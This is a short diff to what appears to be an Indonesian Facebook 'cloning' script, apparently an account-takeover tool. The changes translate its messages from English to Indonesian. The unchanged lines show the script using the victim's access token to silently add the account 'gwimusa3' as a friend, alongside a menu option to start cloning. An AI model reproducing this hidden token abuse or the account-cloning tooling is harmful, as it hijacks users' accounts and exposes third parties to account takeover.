@@ -241,7 +241,7 @@ def login1():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
+			print"\n\x1b[1;97mTidak Ada Koneksi Internet"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -268,15 +268,15 @@ def login1():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print"\n\x1b[1;97mTidak Ada Koneksi Inernet"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mSepertinya Akun Anda Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email Anda Masukan Salah")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -338,7 +338,7 @@ def menu():
 	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
 	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
 	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														
-	print "\033[1;32;98m[0] \033[1;96m>> Log out"
+	print "\033[1;32;98m[0] \033[1;96m>> keluar"
 	pilih()
 
 def pilih():
